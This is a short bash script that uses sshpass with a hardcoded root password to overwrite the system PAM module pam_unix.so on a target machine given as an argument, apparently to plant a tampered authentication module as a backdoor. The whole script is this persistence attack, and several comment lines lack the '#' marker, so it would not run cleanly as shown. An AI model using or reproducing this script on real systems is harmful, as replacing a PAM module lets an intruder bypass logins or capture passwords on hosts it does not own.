#!/bin/bash

Assign command-line arguments to variables
local_ip="$1"
username="root"
password="Password1!"
local_file_path="./pam_unix.so"
remote_file_path="/lib/x86_64-linux-gnu/security/pam_unix.so"

Use SSH to place file
sshpass -p "$password" scp "$local_file_path" "$username"@"$local_ip":"$remote_file_path"

Check if file placement was successful
if [ $? -eq 0 ]; then
    echo "File successfully placed on $local_ip"
else
    echo "Failed to place file on $local_ip"
fi